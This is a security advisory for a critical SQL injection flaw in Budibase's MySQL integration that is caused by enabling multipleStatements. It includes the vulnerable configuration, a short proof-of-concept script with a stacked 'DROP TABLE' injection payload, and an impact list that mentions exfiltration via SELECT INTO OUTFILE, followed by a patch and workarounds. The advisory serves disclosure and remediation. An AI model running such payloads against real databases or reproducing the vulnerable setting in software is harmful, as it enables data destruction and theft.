# [C]  Budibase: SQL Injection via `multipleStatements: true`

## Summary
Severity: Critical
Advisory: GHSA-q6x4-v3qx-85qw
CVE: CVE-2026-73300
CWE: CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-q6x4-v3qx-85qw
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0

## Details
## Summary
A critical SQL injection vulnerability was discovered in Budibase's MySQL integration that allows remote attackers to execute arbitrary SQL commands.

## Details
### Vulnerability Type
SQL Injection

### Description
The MySQL integration component in Budibase is configured with `multipleStatements: true`, enabling execution of multiple SQL statements in a single query. Attackers can inject malicious SQL commands through user input fields, leading to complete database compromise.

### Location
```typescript
// File: packages/server/src/integrations/mysql.ts
// Line: 173

this.config = {
  ...config,
  typeCast: defaultTypeCasting,
  multipleStatements: true,  // VULNERABLE
  timezone: "Z",
}
```

## Proof of Concept

### Exploit
```javascript
const mysql = require('mysql2');

// Budibase vulnerable configuration
const connection = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'password',
  multipleStatements: true,  // Vulnerable setting
  timezone: "Z"
});

// Attack: Data destruction
connection.query(
  `SELECT * FROM users WHERE id = 1; DROP TABLE sensitive_data; --`,
  (err, results) => {
    if (!err) console.log("Table dropped successfully");
  }
);
```

## Impact
- **Data Destruction**: Execute DROP TABLE, DELETE commands
- **Data Theft**: Exfiltrate data via SELECT INTO OUTFILE
- **Privilege Escalation**: Grant database admin privileges
- **Denial of Service**: Disrupt service operations
- **Complete Database Compromise**: Full control over database

## Remediation
### Patch
```diff
--- a/packages/server/src/integrations/mysql.ts
+++ b/packages/server/src/integrations/mysql.ts
@@ -170,7 +170,7 @@ class MySQLIntegration extends Sql implements DatasourcePlus {
     this.config = {
       ...config,
       typeCast: defaultTypeCasting,
-      multipleStatements: true,
+      multipleStatements: false,
       timezone: "Z",
     }
   }
```

### Workarounds
1. Temporarily disable MySQL integration
2. Implement web application firewall (WAF)
3. Restrict database user privileges

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-q6x4-v3qx-85qw
- https://nvd.nist.gov/vuln/detail/CVE-2026-73300
- https://github.com/Budibase/budibase
- https://github.com/Budibase/budibase/releases/tag/3.40.0
